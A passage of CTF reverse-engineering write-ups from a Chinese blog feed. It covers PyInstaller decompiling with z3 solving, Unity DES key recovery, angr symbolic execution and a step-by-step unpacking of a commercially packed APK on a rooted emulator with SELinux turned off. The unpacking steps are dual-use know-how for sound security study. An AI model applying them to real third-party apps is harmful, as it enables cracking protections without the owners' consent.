        <content type="html"><![CDATA[<blockquote><p>题目源于【羊城杯 2020】，主要考点为exe文件反编译为py文件，以及z3解方程</p></blockquote><p>记录一下Reverse中的exe反编译为py文件</p><span id="more"></span><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p><strong>exeinfo分析</strong></p><p>把文件放到exeinfo看到是用py3.6版本的pyinstaller打包的</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103271842e0e47e71bcf6adb68ead.png" alt="image-20210327164113543" style="zoom: 80%;" /><p><strong>exe-&gt;pyc</strong></p><blockquote><p>pyinstxtractor下载地址：<a href="https://github.com/countercept/python-exe-unpacker.git">https://github.com/countercept/python-exe-unpacker.git</a></p></blockquote><p>使用pyinstxtractor把exe里的pyc提取出来，py环境要尽量贴合源代码</p><pre><code class="shell">python pyinstxtractor.py attachment.exe</code></pre><p>找到和与题目对应的文件<code>login</code>，并添加后缀修改为<code>login.pyc</code>，因为pyinstaller在反编译时会把对应的py版本、时间戳等信息去掉，所以我们需要使用<code>010 Editor</code>或其他十六进制编辑器打开<code>login.pyc</code>和同目录下的<code>struct</code>，把<code>struct</code>的前12个字节填补到<code>login.pyc</code>前面</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210327184298387f324a69568decb6.png" alt="image-20210327165157405" style="zoom: 80%;" /><p><strong>pyc-&gt;py</strong></p><blockquote><p>安装uncompyle6：pip install uncompyle6</p></blockquote><p>把pyc文件反编译为py文件</p><pre><code class="shell">uncompyle6 -o login.py login.pyc</code></pre><h3 id="z3解方程"><a href="#z3解方程" class="headerlink" title="z3解方程"></a>z3解方程</h3><p>源代码恢复如下</p><pre><code class="python">import sysinput1 = input(&#39;input something:&#39;)if len(input1) != 14:    print(&#39;Wrong length!&#39;)    sys.exit()else:    code = []    for i in range(13):        code.append(ord(input1[i]) ^ ord(input1[(i + 1)]))    code.append(ord(input1[13]))    a1 = code[2]    a2 = code[1]    a3 = code[0]    a4 = code[3]    a5 = code[4]    a6 = code[5]    a7 = code[6]    a8 = code[7]    a9 = code[9]    a10 = code[8]    a11 = code[10]    a12 = code[11]    a13 = code[12]    a14 = code[13]    if (a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317):        print(&#39;flag is GWHT&#123;md5(your_input)&#125;&#39;)        print(&#39;Congratulations and have fun!&#39;)    else:        print(&#39;Sorry,plz try again...&#39;)</code></pre><p>直接丢z3就能出来了</p><blockquote><p>需要注意的是要把(a8 &lt;&lt; 7)改为(a8 * 128)，不然会报以下错误（Int类型不支持移位操作）</p><p>TypeError: unsupported operand type(s) for &lt;&lt;: ‘ArithRef’ and ‘ArithRef’</p></blockquote><pre><code class="python">from z3 import *import reimport hashlibcode1 = [0] * 14code2 = [0] * 14flag = [0] * 14orders = [2, 1, 0, 3, 4, 5, 6, 7, 9 ,8, 10, 11, 12, 13]for i in range(1, 15):    globals()[f&#39;a&#123;i&#125;&#39;] = Int(f&#39;a&#123;i&#125;&#39;)s = Solver()equations = &#39;(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) &amp; (a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) &amp; (a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) &amp; (a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) &amp; (a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; (a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) &amp; (a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) &amp; (a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) &amp; (a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) &amp; (a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) &amp; (a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) &amp; (a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) &amp; (a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) &amp; (a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)&#39;equations = equations.replace(&#39;&lt;&lt; 7&#39;, &#39;* 128&#39;)equations = equations.split(&#39;&amp;&#39;)[s.add(eval(_)) for _ in equations]if s.check() == sat:    m = s.model()    for i in m:        # print(&quot;%s = %ld&quot; % (i, m[i].as_long()))        index = int(re.search(r&#39;\d+&#39;, str(i)).group()) - 1        code1[index] = m[i].as_long()# 置换for i in range(len(code1)):    code2[orders[i]] = code1[i]# 异或flag[13] = code2[13]for i in range(12, -1, -1):    flag[i] = flag[i + 1] ^ code2[i]print(&#39;[+] flag:&#39;, hashlib.md5(&#39;&#39;.join([chr(_) for _ in flag]).encode()).hexdigest())# [+] flag: 58964088b637e50d3a22b9510c1d1ef8</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse中Unity的逆向</title>
      <link href="/2021/03/21/Reverse%E4%B8%ADUnity%E7%9A%84%E9%80%86%E5%90%91/"/>
      <url>/2021/03/21/Reverse%E4%B8%ADUnity%E7%9A%84%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>记录一下关于Unity程序的基本逆向思路</p><span id="more"></span><h2 id="Who-is-he"><a href="#Who-is-he" class="headerlink" title="Who is he"></a>Who is he</h2><blockquote><p>题目源于【SCTF2019】，考点为Unity程序逆向</p></blockquote><h3 id="dnspy分析"><a href="#dnspy分析" class="headerlink" title="dnspy分析"></a>dnspy分析</h3><p>题目是Unity程序，只有一段视频，一个输入框和一个点击按钮</p><p>因为.NET应用把所有的C#代码都打包在了<code>Assembly-CSharp.dll</code>，所以把<code>Who is he/Who is he_Data/Managed/Assembly-CSharp.dll</code>文件放入到dnspy分析</p><p>可以看到程序只是判断了提交的数据与程序某一段密文的解密结果是否相同，其中数据加密流程如下，是一个CBC模式的DES，而且给出了key，iv（和key一样）和密文</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103212021bc5cb718883dcc9f2f1e.png" alt="image-20210321172137884"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103212021542ba7569bce279fa908.png" alt="image-20210321172049937"></p><p>直接写解密脚本</p><blockquote><p>这里需要注意的是C#里面字符串默认是Unicode，每个字符后面补”\x00”，所以这里的key为”1\x002\x003\x004\x00”</p></blockquote><pre><code class="python">import base64from Crypto.Cipher import DESkey = &quot;1\x002\x003\x004\x00&quot;des = DES.new(key, DES.MODE_CBC, key)cipher = &quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode()print(plain)# He_P1ay_Basketball_Very_We11!Hahahahaha!</code></pre><p>但是这个flag是假的，所以这个<code>Assembly-CSharp.dll</code>其实打包的不是真正的源码，所以我们就得动态调式程序来获取真实值</p><h3 id="cheat-engine分析"><a href="#cheat-engine分析" class="headerlink" title="cheat engine分析"></a>cheat engine分析</h3><p>开外挂器查看其内存，在ce中搜索弹窗里面出现的字符串”Emmmmm”，发现一共有两处</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210321202185f0353d43ffa725a934.png" alt="image-20210321200237714"></p><p>两处Emmmmm的上下文我们都发现了不同的的密文和key</p><pre><code class="python">import base64from Crypto.Cipher import DESkey = &quot;t\x00e\x00s\x00t\x00&quot;# key = &quot;1\x002\x003\x004\x00&quot;des = DES.new(key, DES.MODE_CBC, key)cipher = &quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = &#39;78 00 5A 00 57 00 44 00 5A 00 61 00 4B 00 45 00 68 00 57 00 4E 00 4D 00 43 00 62 00 69 00 47 00 59 00 50 00 42 00 49 00 6C 00 59 00 33 00 2B 00 61 00 72 00 6F 00 7A 00 4F 00 39 00 7A 00 6F 00 6E 00 77 00 72 00 59 00 4C 00 69 00 56 00 4C 00 34 00 6E 00 6A 00 53 00 65 00 7A 00 32 00 52 00 59 00 4D 00 32 00 57 00 77 00 73 00 47 00 6E 00 73 00 6E 00 6A 00 43 00 44 00 6E 00 48 00 73 00 37 00 4E 00 34 00 33 00 61 00 46 00 76 00 4E 00 45 00 35 00 34 00 6E 00 6F 00 53 00 61 00 64 00 50 00 39 00 46 00 38 00 65 00 45 00 70 00 76 00 54 00 73 00 35 00 51 00 50 00 47 00 2B 00 4B 00 4C 00 30 00 54 00 44 00 45 00 2F 00 34 00 30 00 6E 00 62 00 55 00 3D 00&#39;# cipher = &#39;71 00 2B 00 77 00 38 00 39 00 59 00 32 00 32 00 72 00 4F 00 62 00 66 00 7A 00 78 00 67 00 73 00 71 00 75 00 63 00 35 00 51 00 78 00 62 00 62 00 68 00 39 00 5A 00 49 00 41 00 48 00 45 00 54 00 2F 00 4E 00 6E 00 63 00 6D 00 69 00 71 00 45 00 6F 00 36 00 37 00 52 00 72 00 44 00 76 00 7A 00 33 00 34 00 63 00 64 00 41 00 6B 00 30 00 42 00 61 00 6C 00 4B 00 57 00 68 00 4A 00 47 00 6C 00 32 00 43 00 42 00 59 00 4D 00 6C 00 72 00 38 00 70 00 50 00 41 00 3D 00&#39;cipher = cipher.replace(&#39; 00&#39;, &#39;&#39;).split(&#39; &#39;)cipher = &#39;&#39;.join([chr(int(_, 16)) for _ in cipher])cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode()print(plain)# [right] She_P1ay_Black_Hole_Very_Wel1!LOL!XD!# [tip] Oh no!This is a trick!!!</code></pre><p>所以我们最终的flag是<code>flag&#123;She_P1ay_Black_Hole_Very_Wel1!LOL!XD!&#125;</code></p><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><blockquote><p>题目来源于【2019 红帽杯】</p></blockquote><h3 id="dnspy分析-1"><a href="#dnspy分析-1" class="headerlink" title="dnspy分析"></a>dnspy分析</h3><p>用dnspy打开<code>Assembly-CSharp.dll</code>，发现它的接口都是在<code>Interface.dll</code>中引入的</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210322141353479.png" alt="image-20210322141353479"></p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>把<code>Interface.dll</code>拖到IDA分析，找到输出flag的代码，代码量还挺大的，</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032215059479ba02602d50b23ba6.png" alt="image-20210322144354551"></p><p>但是观察到该函数只接受一个a1参数，而且a1有一个约束条件，只在[0, 99]的范围内</p><pre><code class="c">__int64 __fastcall GameObject(int a1) &#123; ... &#125;</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103221505f7d9ebc8122446219e45.png" alt="image-20210322144611115"></p><p>所以我们可以直接导入这个ddl进行爆破</p><pre><code class="python">import ctypesfrom multiprocessing import Pool, Managerdef func(d):    print(d)    dll = ctypes.WinDLL(&quot;Interface.dll&quot;)    dll.GameObject(d)if __name__ == &quot;__main__&quot;:    num = 5    data = range(100)    pool = Pool(processes=num)    manager = Manager()    jobs = []    for d in data:        job = pool.apply_async(func, (d, ))        jobs.append(job)    pool.close()    pool.join()# 19# You win! flag is # flag&#123;Ch4rp_W1th_R$@&#125;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/181019">SCTF2019 Writeup——De1ta</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bang-apk脱壳</title>
      <link href="/2021/03/21/bang-apk%E8%84%B1%E5%A3%B3/"/>
      <url>/2021/03/21/bang-apk%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目源于【网鼎杯2020青龙组 bang】，主要考点为apk脱壳，题目使用梆梆安全加固</p></blockquote><p>记录一下如何使用<code>ApkShelling</code>脱壳</p><span id="more"></span><h3 id="安卓模拟器"><a href="#安卓模拟器" class="headerlink" title="安卓模拟器"></a>安卓模拟器</h3><p>我这里使用地是Android Studio创建安卓模拟器，当然你也可以直接下一个拥有root权限的安卓模拟器</p><p>镜像要求：</p><ul><li>Android 8.0（包含8.0）以下的镜像</li><li>镜像Google APIs</li><li>ABI为x86架构</li></ul><p>使用可写权限启动模拟器</p><blockquote><p>以后想要root的话也需要这样打开</p></blockquote><pre><code class="shell">cd xxx/android-sdk/toolsemulator -list-avdsemulator -avd Pixel_2_API_24 -writable-system</code></pre><h3 id="安装SuperSU"><a href="#安装SuperSU" class="headerlink" title="安装SuperSU"></a>安装SuperSU</h3><blockquote><p>SuperSU下载地址：<a href="https://supersuroot.org/download/">https://supersuroot.org/download/</a></p></blockquote><pre><code class="shell">cd xxx/android-sdk/platform-toolsadb install supersu-2-82.apk</code></pre><h3 id="安装Xposed"><a href="#安装Xposed" class="headerlink" title="安装Xposed"></a>安装Xposed</h3><blockquote><p>Xposed下载地址：<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p></blockquote><pre><code class="shell">cd xxx/android-sdk/platform-toolsadb install XposedInstaller_3.1.5.apk</code></pre><h3 id="Root模拟器"><a href="#Root模拟器" class="headerlink" title="Root模拟器"></a>Root模拟器</h3><pre><code class="shell">cd xxx/android-sdk/platform-toolsadb rootadb remountadb shell setenforce 0exit</code></pre><h3 id="上传配置文件"><a href="#上传配置文件" class="headerlink" title="上传配置文件"></a>上传配置文件</h3><blockquote><p>SupoerSu.zip下载地址：<a href="https://download.chainfire.eu/1220/SuperSU">https://download.chainfire.eu/1220/SuperSU</a></p></blockquote><p>把<code>SuperSu/x86/su.pie</code>上传到模拟器</p><pre><code class="shell">adb push su.pie /system/bin/suadb push su.pie /system/xbin/su</code></pre><p>进入adb shell修改文件权限</p><pre><code class="shell">adb shellchmod 0755 /system/bin/suchmod 0755 /system/xbin/susu --installsu --daemon&amp;</code></pre><p>在模拟器上分别打开SuperSU和Xposed Installer进行安装</p><blockquote><p>安装SuperSU时不要选择更新，不然会卡死在开机页面，需要重新root</p><p>安装Xposed Installer后授权重启即可</p><p>关闭模拟器时直接x掉就好，千万不要选power off，不然需要重新root</p><p>重启使用adb reboot</p></blockquote><h3 id="安装ApkShelling"><a href="#安装ApkShelling" class="headerlink" title="安装ApkShelling"></a>安装ApkShelling</h3><blockquote><p>AplShelling下载地址：<a href="https://github.com/OakChen/ApkShelling">https://github.com/OakChen/ApkShelling</a></p></blockquote><p>Android Studio打开ApkShelling，修改XposedEntry.java的targetPackages值，加入需要脱壳的包名</p><pre><code class="java">private static final String[] targetPackages =        new String[]&#123;&quot;com.example.how_debug&quot;, &quot;com.sfysoft.shellingtest2&quot;&#125;;</code></pre><blockquote><p>launch option改为nothing</p></blockquote><p>安装完后重启，然后上传题目的apk，再拉取题目的dex</p><pre><code class="powershell">adb shell ls /data/data/com.example.how_debugadb pull /data/data/com.example.how_debug/00125-02.dex ./</code></pre><p>jadx直接打开dex搜索flag</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032017503e57ecc42afcf9a2e56f.png" alt="image-20210320174944804" style="zoom: 80%;" /><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/lostnerv/article/details/106061517">Reverse 解法2：bang Writeup（安卓简单的加壳）（2020网鼎杯青龙组）</a></p><p><a href="https://juejin.cn/post/6844903840026722311">搞机：AS自带模拟器AVD Root 和 Xposed安装</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse中Angr的利用</title>
      <link href="/2021/03/19/Reverse%E4%B8%ADAngr%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2021/03/19/Reverse%E4%B8%ADAngr%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>记录一下入门Reverse中符号执行的利用</p><span id="more"></span><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><blockquote><p>官方文档：<a href="http://angr.io/api-doc/angr.html">http://angr.io/api-doc/angr.html</a></p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Angr是一个利用python开发的二进制程序分析框架，我们可以利用这个工具尝试对一些CTF题目进行符号执行来找到正确的解答，即flag。当然，要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>ubuntu安装教程如下</p><pre><code class="shell"># 安装依赖sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper# 在/etc/profile中加入以下代码并进行sourceexport WORKON_HOME=$HOME/Python-workhomesource /usr/share/virtualenvwrapper/virtualenvwrapper.sh# 安装angrmkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr# 运行angrworkon angr</code></pre><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p><strong>基础实例</strong></p><pre><code class="python">import angrdef main():    p = angr.Project(&quot;r100&quot;, auto_load_libs=True)    simgr = p.factory.simulation_manager(p.factory.full_init_state())    simgr.explore(find=0x400844, avoid=0x400855)    return simgr.found[0].posix.dumps(0).strip(b&#39;\0\n&#39;)if __name__ == &#39;__main__&#39;:    print(main())</code></pre><p><strong>加载依赖库</strong></p><p>auto_load_libs用来设置是否自动载入依赖的库，如果设置为True会自动载入依赖的库，然后分析到库函数调用时也会进入库函数，这样会增加分析的工作量。如果为False，程序调用函数时，会直接返回一个不受约束的符号值</p><p><strong>设置SimState</strong></p><p>SimState表示程序的状态，包括它的内存、寄存器等等</p><p>SimState对象通常有三种：</p><ol><li><code>blank_state(**kwargs)</code><br>返回一个未初始化的state，此时需要主动设置入口地址，以及自己想要设置的参数</li><li><code>entry_state(**kwargs)</code><br>返回程序入口地址的state，通常来说都会使用该状态</li><li><code>full_init_state(**kwargs)</code><br>和<code>entry_state(**kwargs)</code>类似，但是调用在执行到达入口点之前应该调用每个初始化函数</li></ol><p>我们可以通过 <code>state.regs</code> 和 <code>state.mem</code> 访问寄存器和内存信息。</p><pre><code class="python">state.regs.ripstate.regs.raxstate.mem[proj.entry].int.resolved</code></pre><p><strong>创建Simulation Managers</strong></p><p>p.factory.simulation_manager创建一个simulation_manager进行模拟执行，其中传入一个SimState</p><p>SimulationManager一共有三种运行方式：</p><ol><li><code>step()</code><br>每次向前运行一个基本块，并返回进行分类</li><li><code>run()</code><br>运行完所有的基本块，然后会出现deadended的状态，此时我们通常访问最后一个状态来获取我们所需要的信息</li><li><code>explore()</code><br>根据find和avoid进行基本块的执行，最后会返回found和avoid状态</li></ol><p><strong>获取执行结果</strong></p><p>simgr.found存储了所有符合条件的分支</p><p><strong>help命令</strong></p><p>可以使用help命令查看某个函数的详细说明，比如<code>help(state)</code></p><p><strong>clarioy</strong></p><blockquote><p>官方文档：<a href="http://angr.io/api-doc/claripy.html">http://angr.io/api-doc/claripy.html</a></p></blockquote><p>claripy是一个符号求解引擎，和z3类似，通常用来构造输入，单位为bit</p><p>使用<code>claripy.BVS()</code>创建位向量符号</p><pre><code class="python">claripy.BVS(&quot;u&quot;, 8)</code></pre><p>使用<code>claripy.BVV()</code>创建位向量值</p><pre><code class="python">claripy.BVV(0xab, 0x2 * 8)</code></pre><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>这个<a href="https://github.com/jakespringer/angr_ctf">地址</a>是官方关于在CTF利用Angr的详细教程</p><p>这个<a href="https://docs.angr.io/examples">地址</a>是官方给出的在CTF比赛中使用Angr的例子，都是些精髓</p><p>此外还有@<a href="https://xz.aliyun.com/u/11261">Badrer</a>师傅在先知也写了很多相关的文章，大家可以学习一下</p><p>下面是一些我碰到的一些CTF例子，会不断地进行更新</p><h2 id="funnyre"><a href="#funnyre" class="headerlink" title="funnyre"></a>funnyre</h2><blockquote><p>题目源于【WUSTCTF2020】</p></blockquote><h3 id="去花指令"><a href="#去花指令" class="headerlink" title="去花指令"></a>去花指令</h3><p>直接用IDA打开，尝试反编译main函数发现有花指令，根据上下文逻辑nop掉图中红框部分，一共有4处</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103192317bf81ee1b2abcab097522.png" alt="image-20210319172652670" style="zoom:80%;" /><p>把data强制分析为code，再把修改过的code声明为function，之后就可以正常的反汇编了</p><p>main()函数中确定了flag的长度和格式，还有一长串的异或运算</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021031923179e8ec2c34d6a38fed435.png" alt="image-20210319211423984" style="zoom: 80%;" /><p>最后与unk_4025C0的数据进行比对</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103192317b68e2a8d0e4880427510.png" alt="image-20210319211739539" style="zoom:80%;" /><h3 id="符号执行-1"><a href="#符号执行-1" class="headerlink" title="符号执行"></a>符号执行</h3><p>到这里就可以有三种解决方法，第一种是直接爆破，时间会很长；第二种是把所有代码逆回去，会很麻烦；第三种，也是最简单的一种，就是使用Angr来进行符号执行约束求解</p><p>下面给出符号执行的代码</p><pre><code class="python">import angrimport claripy# 创建projectp = angr.Project(&quot;./attachment&quot;, load_options=&#123;&quot;auto_load_libs&quot;: False&#125;)# 设置程序入口,此处必须是flag加载完的位置state = p.factory.entry_state(addr=0x400601)# 创建符号向量flag = claripy.BVS(&quot;flag&quot;, 8*32)# 按照程序逻辑flag存放在rdx的第6位,因为前5位是&#39;flag&#123;&#39;state.memory.store(state.regs.rdx + 5, flag)&#39;&#39;&#39;# 也可以自己手动修改rdx的位置，但是相对位置不变就行state.memory.store(0x603056+0x300 + 5, flag)state.regs.rdx = 0x603056+0x300&#39;&#39;&#39;# 创建Simulation Managersm = p.factory.simulation_manager(state)print(&quot;[+] init ok&quot;)# 设置探索成功的地址sm.explore(find=0x401DAE)if sm.found:    print(&quot;[+] found!&quot;)    #输出flag结果    x = sm.found[0].solver.eval(flag, cast_to=bytes).strip(b&#39;\0&#39;)    print(x)</code></pre><h2 id="very-success"><a href="#very-success" class="headerlink" title="very_success"></a>very_success</h2><blockquote><p>题目来源于【flareon2015_2】</p></blockquote><h3 id="符号执行-2"><a href="#符号执行-2" class="headerlink" title="符号执行"></a>符号执行</h3><p>程序主要代码如下，把用户输入存储到<code>byte_402159</code>中，其中用户输入为37位，<code>sub_401084()</code>对用户输入进行加密，最后与系统的<code>a1</code>比较，相同则成功，其中<code>a1</code>可以通过动态调试得到</p><p>所以我们可以把符号执行的初始地址地位在<code>sub_401084()</code>的开始</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210322015898685f1ba3e262015856.png" alt="image-20210322002451961"></p><p>选取好了初始地址之后，我们需要给参数进行赋值，这里涉及到对内存进行操控</p><p>第1个参数来源于<code>0x401064</code>，即函数的返回地址</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103220158b532dd716df687936055.png" alt="image-20210322013920422"></p><p>第2个参数来源于<code>0x4010e4</code>，得追溯到父函数</p><p><img 